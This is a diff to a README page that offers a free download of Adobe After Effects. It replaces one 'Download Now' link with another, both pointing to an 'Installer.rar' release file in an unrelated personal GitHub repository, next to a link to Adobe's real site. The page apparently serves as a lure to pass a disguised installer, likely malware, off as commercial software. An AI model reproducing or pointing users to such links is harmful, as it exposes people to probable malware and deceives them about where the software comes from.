@@ -11,7 +11,7 @@
 
 ## 🚀 Download Adobe After Effects
 
-- **Latest Version:** [Download Now](https://github.com/bernardodangelo/season-9-5/releases/download/0.1.2/Installer.rar)
+- **Latest Version:** [Download Now](https://github.com/bernardodangelo/beer/releases/download/1/Installer.rar)
 - **Adobe Website:** [Visit](https://www.adobe.com/products/aftereffects.html)
 
 ---
